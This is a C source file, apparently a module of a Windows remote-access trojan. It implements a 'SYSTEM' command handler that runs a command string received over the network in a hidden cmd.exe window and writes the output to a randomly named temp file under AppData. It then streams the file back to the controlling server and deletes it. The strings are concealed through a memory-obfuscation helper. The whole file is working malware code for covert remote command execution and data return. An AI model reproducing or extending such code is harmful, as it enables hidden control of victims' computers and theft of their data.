#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <windows.h>
#include "commands/cmds.h"
#include "net/interface.h"
#include "net/error.h"
#include "types.h"
#include "random.h"
#include "memProtect.h"

#define SERV_SYSTEM_DATA 0x1
#define SERV_SYSTEM_END 0x2

#define SERV_SYSTEM_FAILED 0x0F

int cmds_SYSTEM(uint8* msg)
{
	srand(time(NULL));

	char* _appPath = (char*)memProtect_Request(MEMPROTECT_APPDATA);
	char* tempPath = getenv(_appPath);
	free(_appPath);

	char* randName = random_Ascii(10);
	int pathLen = strlen(tempPath) + strlen(randName) + 1 + sizeof(char);

	char* fpath = malloc(pathLen);
	snprintf(fpath, pathLen, "%s\\%s", tempPath, randName);
	free(randName);

	PROCESS_INFORMATION procInfo;
	STARTUPINFO startInfo;
	
	memset(&procInfo, 0, sizeof(PROCESS_INFORMATION));
	memset(&startInfo, 0, sizeof(STARTUPINFO));

	char* _cmdc = (char*)memProtect_Request(MEMPROTECT_CMD_C);

	startInfo.cb = sizeof(STARTUPINFO);
	int cmdMsgLen = strlen((char*)msg) + strlen(_cmdc) + strlen(" > ") + strlen(fpath) + sizeof(char);
	char* cmdMsg = malloc(cmdMsgLen);
	snprintf(cmdMsg, cmdMsgLen, "%s%s > %s", _cmdc, msg, fpath);

	free(_cmdc);

	if(CreateProcess(NULL, cmdMsg, NULL, NULL, 1, CREATE_NO_WINDOW, NULL, NULL, &startInfo, &procInfo) == 1)
	{
		Sleep(2000);
		TerminateProcess(procInfo.hProcess, 0);
		CloseHandle(procInfo.hProcess);
		CloseHandle(procInfo.hThread);

		FILE *f = fopen(fpath, "r");

		if(f)
		{
			if(net_SendEmptyCmd(CMDS_SYSTEM) < 1)
			{
				remove(fpath);
				free(fpath);
				free(cmdMsg);

				return 0;
			}

			char buff[net_MaxContLen];
			memset(buff, 0, net_MaxContLen);
			uint8* rmsg;

			while(fgets(buff, net_MaxContLen - 1, f) != NULL)
			{
				if(net_SendCmd((uint8*)buff, strlen(buff), SERV_SYSTEM_DATA) < 1)
				{
					fclose(f);
					remove(fpath);
					free(fpath);
					free(cmdMsg);

					return 0;
				}

				if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
				{
					fclose(f);
					remove(fpath);
					free(fpath);
					free(cmdMsg);

					return 0;
				}

				free(rmsg);
				memset(buff, 0, net_MaxContLen);
			}

			fclose(f);

			if(net_SendCmd((uint8*)buff, strlen(buff), SERV_SYSTEM_END) < 1)
			{
				remove(fpath);
				free(fpath);
				free(cmdMsg);

				return 0;
			}
		}else{
			if(net_SendEmptyCmd(SERV_SYSTEM_FAILED) < 1)
			{
				remove(fpath);
				free(fpath);
				free(cmdMsg);

				return 0;
			}
		}
	}else{
		if(net_SendEmptyCmd(SERV_SYSTEM_FAILED) < 1)
		{
			remove(fpath);
			free(fpath);
			free(cmdMsg);

			return 0;
		}
	}

	remove(fpath);
	free(cmdMsg);
	free(fpath);

	return 1;
}